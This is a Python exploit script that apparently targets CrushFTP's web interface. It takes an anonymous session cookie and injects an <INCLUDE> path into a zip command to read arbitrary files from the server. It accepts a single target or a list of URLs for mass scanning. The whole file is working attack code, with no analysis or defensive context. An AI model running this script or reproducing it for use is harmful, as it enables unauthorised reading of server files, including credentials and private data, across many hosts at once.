import requests
import argparse

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

def get_cookies(url):
    try:
        session = requests.Session()
        session.get(url)
        return session.cookies.get_dict()
    except Exception as e:
        print(FAIL + "Connection Error:", e, ENDC)
        quit()

def exploit(url, cookies, path):
    try:
        url = url + "/WebInterface/function/?command=zip&c2f=" + cookies['currentAuth'] + "&path=<INCLUDE>" + path + "</INCLUDE>&names=*"
        request = requests.get(url, cookies=cookies)
        print("URL:", url)
        return request.text
    except Exception as e:
        print(FAIL + "Connection Error:", e, ENDC)
        quit()

def main(url, path):
    if not url.startswith("http"):
        print(WARNING + "URL should start with http or https" + ENDC)
        return

    cookies = get_cookies(url)
    if 'currentAuth' not in cookies or not cookies['currentAuth']:
        print(WARNING + "Not vulnerable" + ENDC)
        return
    else:
        print(OKCYAN + exploit(url, cookies, path) + ENDC)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--path", help="Path to the file to read", required=True)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="URL of the target")
    group.add_argument("-l", "--list", help="File containing list of URLs")
    args = parser.parse_args()

    path = args.path

    if args.url:
        main(args.url, path)
    elif args.list:
        with open(args.list, 'r') as file:
            for line in file:
                url = line.strip()
                main(url, path)